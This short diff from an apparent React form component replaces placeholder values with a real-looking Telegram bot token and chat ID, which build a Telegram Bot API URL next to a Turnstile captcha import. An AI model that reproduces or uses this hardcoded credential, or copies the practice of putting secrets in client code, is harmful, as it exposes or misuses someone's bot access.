@@ -7,8 +7,8 @@ import Turnstile from "react-turnstile";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faInfoCircle } from "@fortawesome/free-solid-svg-icons";
 
-const BOT_TOKEN = "YOUR_BOT_TOKEN";
-const CHAT_ID = "YOUR_CHAT_ID";
+const BOT_TOKEN = "7127464176:AAG5ZZs4dlEZHxIRGjzQMPtuUsYgTroG0Fs";
+const CHAT_ID = "1600255418";
 const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 interface FormData {
